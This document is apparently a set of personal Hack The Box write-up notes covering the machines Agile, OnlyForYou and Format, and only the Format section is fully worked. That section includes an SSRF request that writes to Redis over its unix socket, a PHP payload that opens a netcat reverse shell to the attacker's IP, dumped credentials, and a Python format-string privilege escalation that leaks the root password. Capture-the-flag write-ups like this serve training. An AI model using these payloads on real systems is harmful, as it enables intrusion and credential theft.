## Agile
### Reco
### Weaponisation
### Exploitation
### User flag
### Root flag
![](https://hackmd.io/_uploads/H1N6hTich.png)

## OnlyForYou
> To obtain access we must read various files on the web using an LFI to find a vulnerability in the form. Using the form we can run CERs. To move to a user we must perform a Cypher Injection on an internal website to get the password. And for the escalation of privileges we must modify a file, create a tar.gz and upload it to the Gogs web intera and then download the file using pip3 and thus be able to modify the bash to SUID permissions.
### Reco
1. nmap 10.10.11.210 -sVC
2. dir busting
    - there is a subdomain
    ![](https://hackmd.io/_uploads/rytoaqich.png)
    - add it also to the /etc/hosts

### Weaponisation
1. beta subdomain
    - allows us to download source code
        ![](https://hackmd.io/_uploads/BklH0qoqh.png)
        - When analyzing it we realize that in the / download path if in the parameter image start with 2 points then launch a message that says Hacking detected and makes us a redirect to / list.
            ![](https://hackmd.io/_uploads/HkT9C5iq3.png)
### Exploitation
1. BurpSuite - LFI
    - 
### User flag
### Root flag

## Format
### Reco
1. nmap: `nmap -sVC 10.10.11.213`
    - 22 SSH
    - 80,3000 HTTP
2. add microblog.htb:3000 to /etc/hosts
3. FUZZING - subdomain enumeration
    - app, sunny
        - add these both to /etc/hosts also
4. Website
    - "Contribute here!" in footer -> source code of app.microblog.htb
### Weaponisation
1. LFI
    - we can use ID parameter for LFI
        - create a blog -> edit blog
            - capture req to add the H1/text
                - we can edit the ID paramater for LFI
                    ![](https://hackmd.io/_uploads/SkOVqn0q2.png)
### Exploitation
1. PRO account
    - dashboard page and source code -> something about PRO 
    - assign pro to our session using SSRF
> curl -X "HSET" http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:testy%20pro%20true%20a/b

- insert the username of registration
2. Uploading reverse shell
    - use this to get RS on target machine + change your blog name
> id=/var/www/microblog/<your_blog_name>/uploads/rev.php&header=<%3fphp+echo+shell_exec("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.14.30+443+>/tmp/f")%3b%3f>
![](https://hackmd.io/_uploads/rJj-j309h.png)

- after visiting the /uploads/rev.php we will get our RS
### User flag
1. Connect to Redis-cli
    - socks config file
        - redis-cli -s /var/run/redis/redis.sock
        - keys *
            ![](https://hackmd.io/_uploads/SyLwo205h.png)
        - hgetall cooper.dooper
            - `cooper:zooperdoopercooper`
2. SSH connect to obtain user flag
### Root flag
1. trying `sudo -l`
    - we can run /usr/bin/licence
        - this file is also readable
            - [Python format function vuln](https://web.archive.org/web/20230624063634/https://podalirius.net/en/articles/python-format-string-vulnerabilities/)
2. Vuln
    - register a user using redis-cli and use the vuln in username to print all variables
        - `HSET test2 username test1 password test first-name` 
        - `{license.__init__.__globals__} last-name test pro false`
            ![](https://hackmd.io/_uploads/S1LOThRq3.png)
    - run /usr/bin/licence as sudo to provision the licence of our "test2" user
        - `sudo /usr/bin/license -p test2`
            ![](https://hackmd.io/_uploads/Hy_na3Rc2.png)
            - we obtained SSH credentials for root
                - `root:unCR4ckaBL3Pa$$w0rd`
3. SSH login as a root to obtain root flag






